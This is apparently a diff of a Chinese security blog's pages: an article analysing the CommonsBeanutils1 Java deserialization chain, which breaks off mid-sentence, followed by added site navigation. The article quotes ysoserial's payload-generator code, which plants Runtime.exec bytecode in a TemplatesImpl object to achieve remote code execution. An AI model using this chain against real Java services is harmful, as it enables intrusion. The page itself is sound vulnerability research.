-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tools/ title=Tools class=dd-item><a href=/zh-cn/misc/tools/><b>X. </b>Tools
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tools/citrix-update-monitor/ title="【工具】Citrix NetScaler 更新监控" class=dd-item><a href=/zh-cn/misc/tools/citrix-update-monitor/>【工具】Citrix NetScaler 更新监控
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/encoding/ title=Encoding class=dd-item><a href=/zh-cn/misc/encoding/><b>X. </b>Encoding
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/encoding/utf-7/ title="Utf 7" class=dd-item><a href=/zh-cn/misc/encoding/utf-7/>Utf 7
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/misc/encoding/unicode/ title=Unicode class=dd-item><a href=/zh-cn/misc/encoding/unicode/>Unicode
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/ title=隧道 class=dd-item><a href=/zh-cn/misc/tunnel/><b>X. </b>隧道
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ title=应用层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/><b>X. </b>应用层隧道
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/ title=SSH隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/>SSH隧道
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/ title=传输层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/><b>X. </b>传输层隧道
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/socks/ title=Socks隧道 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/socks/><b>X. </b>Socks隧道
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/network-layer/ title=网络层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/network-layer/><b>X. </b>网络层隧道
-<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/others/ title=其他 class=dd-item><a href=/zh-cn/others/><b>X. </b>其他
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/others/add-timeline-shortcode/ title=给hugo-theme-learn增加timeline功能 class=dd-item><a href=/zh-cn/others/add-timeline-shortcode/>给hugo-theme-learn增加timeline功能
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/ title="在Windows server 2019上重置密码" class=dd-item><a href=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/>在Windows server 2019上重置密码
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/ title=基于Vmware的小型域网络搭建 class=dd-item><a href=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/>基于Vmware的小型域网络搭建
-<i class="fas fa-check read-icon"></i></a></li></ul></li></ul><section id=shortcuts><h3>更多</h3><ul><li><a class=padding href=https://www.ch35tnut.site/zh-cn/about><i class='fas fa-person-booth'></i> 关于</a></li><li><a class=padding href=https://github.com/Chestnut4/><i class='fab fa-github'></i> Github 链接</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/tags><i class='fas fa-tags'></i> 标签</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/index.xml><i class='fas fa-fw fa-link'></i> RSS</a></li></ul></section><section id=prefooter><hr><ul><li><a class=padding><i class="fas fa-language fa-fw"></i><div class=select-style><select id=select-language onchange="location=this.value"><option id=zh-cn value=https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ selected>简体中文</option></select><svg id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="255" height="255" viewBox="0 0 255 255" style="enable-background:new 0 0 255 255"><g><g id="arrow-drop-down"><polygon points="0,63.75 127.5,191.25 255,63.75"/></g></g></svg></div></a></li><li><a class=padding href=# data-clear-history-toggle><i class="fas fa-history fa-fw"></i> 清理历史记录</a></li></ul></section><section id=footer><center></center><script async defer src=https://buttons.github.io/buttons.js></script></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i>
-</a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span>
-<span class=links><a href=/zh-cn/>首页</a> > <a href=/zh-cn/research/>安全研究</a> > <a href=/zh-cn/research/web/>Web</a> > <a href=/zh-cn/research/web/java-deserialization/>Java Deserialization</a> > CommonsBeanutils1 Chain</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><ul><li><a href=#概述>概述</a></li><li><a href=#细节>细节</a></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6>安全研究</a>
-<a class=tag-link href=/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a></div></div><div id=body-inner><h1>CommonsBeanutils1 Chain</h1><div class=progress><div class=wrapper></div></div><nav id=TableOfContents><ul><li><ul><li><a href=#概述>概述</a></li><li><a href=#细节>细节</a></li></ul></li></ul></nav><h3 id=概述>概述</h3><p>在ysoserial中实现了<code>CommonsBeanutils1</code>反序列化链，可以利用这个链执行代码。</p><h3 id=细节>细节</h3><p>在ysoserial中实现<code>CommonsBeanutils1</code>代码如下，首先<code>new BeanComparator/PriorityQueue</code>对象，在<code>PriorityQueue</code>对象内添加两个int对象，而后通过反射修改property字段存储的值</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CommonsBeanutils1</span> <span style=color:#66d9ef>implements</span> ObjectPayload<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getObject</span>(<span style=color:#66d9ef>final</span> String command) <span style=color:#66d9ef>throws</span> Exception {
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>final</span> Object templates <span style=color:#f92672>=</span> Gadgets.<span style=color:#a6e22e>createTemplatesImpl</span>(command);
-</span></span><span style=display:flex><span>		<span style=color:#75715e>// mock method name until armed</span>
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>final</span> BeanComparator comparator <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BeanComparator(<span style=color:#e6db74>&#34;lowestSetBit&#34;</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		<span style=color:#75715e>// create queue with numbers and basic comparator</span>
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>final</span> PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> queue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span>(2, comparator);
-</span></span><span style=display:flex><span>		<span style=color:#75715e>// stub data for replacement later</span>
-</span></span><span style=display:flex><span>		queue.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> BigInteger(<span style=color:#e6db74>&#34;1&#34;</span>));
-</span></span><span style=display:flex><span>		queue.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> BigInteger(<span style=color:#e6db74>&#34;1&#34;</span>));
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		<span style=color:#75715e>// switch method called by comparator</span>
-</span></span><span style=display:flex><span>		Reflections.<span style=color:#a6e22e>setFieldValue</span>(comparator, <span style=color:#e6db74>&#34;property&#34;</span>, <span style=color:#e6db74>&#34;outputProperties&#34;</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		<span style=color:#75715e>// switch contents of queue</span>
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>final</span> Object<span style=color:#f92672>[]</span> queueArray <span style=color:#f92672>=</span> (Object<span style=color:#f92672>[]</span>) Reflections.<span style=color:#a6e22e>getFieldValue</span>(queue, <span style=color:#e6db74>&#34;queue&#34;</span>);
-</span></span><span style=display:flex><span>		queueArray<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> templates;
-</span></span><span style=display:flex><span>		queueArray<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> templates;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> queue;
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>createTemplatesImpl</span>(String command) <span style=color:#66d9ef>throws</span> Exception {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Boolean.<span style=color:#a6e22e>parseBoolean</span>(System.<span style=color:#a6e22e>getProperty</span>(<span style=color:#e6db74>&#34;properXalan&#34;</span>, <span style=color:#e6db74>&#34;false&#34;</span>)) <span style=color:#f92672>?</span> createTemplatesImpl(command, Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;org.apache.xalan.xsltc.trax.TemplatesImpl&#34;</span>), Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span>), Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&#34;</span>)) : createTemplatesImpl(command, TemplatesImpl.<span style=color:#a6e22e>class</span>, AbstractTranslet.<span style=color:#a6e22e>class</span>, TransformerFactoryImpl.<span style=color:#a6e22e>class</span>);
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>createTemplatesImpl</span>(String command, Class<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> tplClass, Class<span style=color:#f92672>&lt;?&gt;</span> abstTranslet, Class<span style=color:#f92672>&lt;?&gt;</span> transFactory) <span style=color:#66d9ef>throws</span> Exception {
-</span></span><span style=display:flex><span>        T templates <span style=color:#f92672>=</span> tplClass.<span style=color:#a6e22e>newInstance</span>();
-</span></span><span style=display:flex><span>        ClassPool pool <span style=color:#f92672>=</span> ClassPool.<span style=color:#a6e22e>getDefault</span>();
-</span></span><span style=display:flex><span>        pool.<span style=color:#a6e22e>insertClassPath</span>(<span style=color:#66d9ef>new</span> ClassClassPath(StubTransletPayload.<span style=color:#a6e22e>class</span>));
-</span></span><span style=display:flex><span>        pool.<span style=color:#a6e22e>insertClassPath</span>(<span style=color:#66d9ef>new</span> ClassClassPath(abstTranslet));
-</span></span><span style=display:flex><span>        CtClass clazz <span style=color:#f92672>=</span> pool.<span style=color:#a6e22e>get</span>(StubTransletPayload.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>getName</span>());
-</span></span><span style=display:flex><span>        String cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style=color:#f92672>+</span> command.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;\\&#34;</span>, <span style=color:#e6db74>&#34;\\\\&#34;</span>).<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;\&#34;&#34;</span>, <span style=color:#e6db74>&#34;\\\&#34;&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;\&#34;);&#34;</span>;
-</span></span><span style=display:flex><span>        clazz.<span style=color:#a6e22e>makeClassInitializer</span>().<span style=color:#a6e22e>insertAfter</span>(cmd);
-</span></span><span style=display:flex><span>        clazz.<span style=color:#a6e22e>setName</span>(<span style=color:#e6db74>&#34;ysoserial.Pwner&#34;</span> <span style=color:#f92672>+</span> System.<span style=color:#a6e22e>nanoTime</span>());
-</span></span><span style=display:flex><span>        CtClass superC <span style=color:#f92672>=</span> pool.<span style=color:#a6e22e>get</span>(abstTranslet.<span style=color:#a6e22e>getName</span>());
-</span></span><span style=display:flex><span>        clazz.<span style=color:#a6e22e>setSuperclass</span>(superC);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> classBytes <span style=color:#f92672>=</span> clazz.<span style=color:#a6e22e>toBytecode</span>();
-</span></span><span style=display:flex><span>        Reflections.<span style=color:#a6e22e>setFieldValue</span>(templates, <span style=color:#e6db74>&#34;_bytecodes&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span>{classBytes, ClassFiles.<span style=color:#a6e22e>classAsBytes</span>(Foo.<span style=color:#a6e22e>class</span>)});
-</span></span><span style=display:flex><span>        Reflections.<span style=color:#a6e22e>setFieldValue</span>(templates, <span style=color:#e6db74>&#34;_name&#34;</span>, <span style=color:#e6db74>&#34;Pwnr&#34;</span>);
-</span></span><span style=display:flex><span>        Reflections.<span style=color:#a6e22e>setFieldValue</span>(templates, <span style=color:#e6db74>&#34;_tfactory&#34;</span>, transFactory.<span style=color:#a6e22e>newInstance</span>());
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> templates;
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>而后通过反射将PriorityQueue对象存储的两个BigInteger对象改为创建的TemplatesImpl对象。
-<img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/1.png></p><p><strong>根因分析</strong>
-根据前面调试知道，<code>CommonsBeanutils1</code>序列化<code>PriorityQueue</code>对象，其中<code>comparator</code>指定为<code>BeanComparator</code>，<code>PriorityQueue</code>内存了两个<code>TemplatesImpl</code>对象。</p><p>使用
+<span data-search-clear><i class="fas fa-times"></i></span>
+</div>
+<script type=text/javascript src=/js/lunr.min.js?1706695571></script>
+<script type=text/javascript src=/js/auto-complete.js?1706695571></script>
+<script type=text/javascript>var baseurl="https://www.ch35tnut.site/zh-cn"</script>
+<script type=text/javascript src=/js/search.js?1706695571></script>
+</div>
+<section id=homelinks>
+<ul>
+<li>
+<a class=padding href=/zh-cn><i class="fas fa-home"></i> 首页</a>
+</li>
+</ul>
+</section>
+<div class=highlightable>
+<ul class=topics>
+<li data-nav-id=/zh-cn/research/ title=安全研究 class="dd-item
+parent">
+<a href=/zh-cn/research/>
+<b>X. </b>安全研究
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/iot/ title=Iot class=dd-item>
+<a href=/zh-cn/research/iot/>
+<b>X. </b>Iot
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/linux/ title=Linux class=dd-item>
+<a href=/zh-cn/research/linux/>
+<b>X. </b>Linux
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/linux/malware/ title=Malware class=dd-item>
+<a href=/zh-cn/research/linux/malware/>
+<b>X. </b>Malware
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/linux/suid/ title=Suid class=dd-item>
+<a href=/zh-cn/research/linux/suid/>
+Suid
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/windows/ title=Windows class=dd-item>
+<a href=/zh-cn/research/windows/>
+<b>X. </b>Windows
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/windows/dll-inject/ title=Dll注入 class=dd-item>
+<a href=/zh-cn/research/windows/dll-inject/>
+<b>X. </b>Dll注入
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/windows/pe/ title=Pe class=dd-item>
+<a href=/zh-cn/research/windows/pe/>
+<b>X. </b>Pe
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/protocol/ title=协议 class=dd-item>
+<a href=/zh-cn/research/protocol/>
+<b>X. </b>协议
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/protocol/ntlm/ title="NTLM 协议" class=dd-item>
+<a href=/zh-cn/research/protocol/ntlm/>
+<b>X. </b>NTLM 协议
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/protocol/kerberos/ title="Kerberos 协议" class=dd-item>
+<a href=/zh-cn/research/protocol/kerberos/>
+<b>X. </b>Kerberos 协议
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/protocol/kerberos/kerberos-in-windows/ title=Windows中的kerberos协议 class=dd-item>
+<a href=/zh-cn/research/protocol/kerberos/kerberos-in-windows/>
+<b>X. </b>Windows中的kerberos协议
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/ title=认证原理 class=dd-item>
+<a href=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/>
+认证原理
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/protocol/netlogon/ title=Netlogon class=dd-item>
+<a href=/zh-cn/research/protocol/netlogon/>
+Netlogon
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/web/ title=Web class="dd-item
+parent">
+<a href=/zh-cn/research/web/>
+<b>X. </b>Web
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/web/java-deserialization/ title="Java Deserialization" class="dd-item
+parent">
+<a href=/zh-cn/research/web/java-deserialization/>
+<b>X. </b>Java Deserialization
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ title="CommonsBeanutils1 Chain" class="dd-item active">
+<a href=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/>
+CommonsBeanutils1 Chain
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/web/java-deserialization/urldns/ title="JAVA URL DNS 研究" class=dd-item>
+<a href=/zh-cn/research/web/java-deserialization/urldns/>
+JAVA URL DNS 研究
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/web/php-filter-rce/ title="PHP Filter RCE 分析" class=dd-item>
+<a href=/zh-cn/research/web/php-filter-rce/>
+PHP Filter RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/code-audit/ title=代码审计 class=dd-item>
+<a href=/zh-cn/research/code-audit/>
+<b>X. </b>代码审计
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/code-audit/codeql/ title=Codeql class=dd-item>
+<a href=/zh-cn/research/code-audit/codeql/>
+<b>X. </b>Codeql
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/code-audit/wireshark-185/ title="Wireshark 1.8.5代码审计" class=dd-item>
+<a href=/zh-cn/research/code-audit/wireshark-185/>
+Wireshark 1.8.5代码审计
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/code-audit/news-server/ title="News Server审计" class=dd-item>
+<a href=/zh-cn/research/code-audit/news-server/>
+News Server审计
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/ title=漏洞分析 class=dd-item>
+<a href=/zh-cn/vulnerability/>
+<b>X. </b>漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/ title="Windows CLFS EoP" class=dd-item>
+<a href=/zh-cn/vulnerability/windows-clfs-eop/>
+<b>X. </b>Windows CLFS EoP
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/ title=CVE-2023-28252 class=dd-item>
+<a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/>
+CVE-2023-28252
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/ title=CVE-2022-37969 class=dd-item>
+<a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/>
+CVE-2022-37969
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/ title="CVE-2023-7028 GitLab Account Takeover" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/>
+CVE-2023-7028 GitLab Account Takeover
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/ title="CVE-2016-4437 Shiro 550 RCE 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/>
+CVE-2016-4437 Shiro 550 RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/ title="CVE 2023 6553 Wordpress Backup Migration Plugin RCE" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/>
+CVE 2023 6553 Wordpress Backup Migration Plugin RCE
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/ title="CVE-2023-50164 Apache Struts RCE分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/>
+CVE-2023-50164 Apache Struts RCE分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/ title="CVE-2023-21746 Windows NTLM Privilege Escalation" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/>
+CVE-2023-21746 Windows NTLM Privilege Escalation
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/ title="CVE-2020-17530 Apache Struts OGNL RCE分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/>
+CVE-2020-17530 Apache Struts OGNL RCE分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/ title="CVE-2021-4034 Polkit 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/>
+CVE-2021-4034 Polkit 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/ title="CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/>
+CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2022-23121-afp-rce/ title="CVE-2022-23121 AFP RCE 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2022-23121-afp-rce/>
+CVE-2022-23121 AFP RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/ title="CVE-2023-36563 Wordpad Info Disclosure 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/>
+CVE-2023-36563 Wordpad Info Disclosure 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/squid-dos/ title="Squid 拒绝服务漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/squid-dos/>
+Squid 拒绝服务漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/ title="CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/>
+CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/ title="CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/>
+CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/ title="CVE-2023-38545 Curl 堆溢出漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/>
+CVE-2023-38545 Curl 堆溢出漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/ title="CVE-2023-4863 Libwebp Rce 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/>
+CVE-2023-4863 Libwebp Rce 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/ title="CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/>
+CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/ title="瑞友天翼 Rce分析" class=dd-item>
+<a href=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/>
+瑞友天翼 Rce分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/ title="CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/>
+CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/ title="CVE-2023-38148 Windows Ics Rce分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/>
+CVE-2023-38148 Windows Ics Rce分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/ title="CVE-2023-3519 Cirtix Gateway RCE分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/>
+CVE-2023-3519 Cirtix Gateway RCE分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/ title="CVE-2023-32315 Openfire 身份认证绕过漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/>
+CVE-2023-32315 Openfire 身份认证绕过漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/smartbi-rce/ title="Smartbi RCE 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/smartbi-rce/>
+Smartbi RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/ title="CVE-2023-2825 Gitlab 路径穿越漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/>
+CVE-2023-2825 Gitlab 路径穿越漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
